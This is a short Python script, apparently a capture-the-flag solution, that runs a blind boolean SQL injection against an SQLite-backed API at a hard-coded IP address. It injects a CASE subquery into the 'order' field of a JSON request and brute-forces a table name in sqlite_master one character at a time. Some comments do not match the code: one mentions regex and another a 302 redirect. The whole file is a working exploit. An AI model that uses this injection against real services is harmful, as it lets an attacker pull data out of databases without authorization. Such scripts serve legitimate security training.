import requests
import string

flag = "flag_"
url = "http://138.68.151.248:31892/api/list"

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits:
        payload = flag + i
        post_data = {'order': '(select case when (select count(name) from sqlite_master where instr(name, \"' + payload + '\")) then id else count end)'}
        r = requests.post(url, json=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if r.json()[0]['id'] == 1:
            print(payload)
            restart = True
            flag = payload
            break